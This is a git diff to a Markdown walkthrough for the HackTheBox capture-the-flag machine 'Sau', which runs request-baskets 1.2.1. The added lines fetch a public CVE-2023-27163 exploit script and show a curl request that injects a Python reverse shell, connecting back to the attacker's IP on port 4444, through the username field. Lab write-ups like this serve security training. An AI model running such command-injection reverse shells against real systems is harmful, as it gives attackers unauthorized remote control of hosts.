@@ -1,5 +1,5 @@
 ---
-title: 'HTB Saw Walkthrough'
+title: 'HTB Sau Walkthrough'
 description: ''
 date: 2026-06-22
 difficulty: Easy
@@ -121,11 +121,24 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 The scan reveals two active services:
 
-- **Port 22 (SSH):** Running `OpenSSH 8.2p1`.
-- **Port 55555 (HTTP):** A web application running on `Golang net/http server`.
+ - **Port 22 (SSH):** Running `OpenSSH 8.2p1`.
+ - **Port 55555 (HTTP):** A web application running on `Golang net/http server`.
 
 
 Powered by request-baskets | Version: 1.2.1
 
 ![Request Baskets](image.png "http://10.129.229.26:55555/web")
 
+
+```shell
+wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/main/CVE-2023-27163.sh
+chmod +x CVE-2023-27163.sh
+```
+
+```shell
+BASKET="testbasket2" 
+KALI_IP="10.10.15.83"
+
+curl -s "http://10.129.229.26:55555/$BASKET/login" \
+  -d "username=;python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$KALI_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
+```
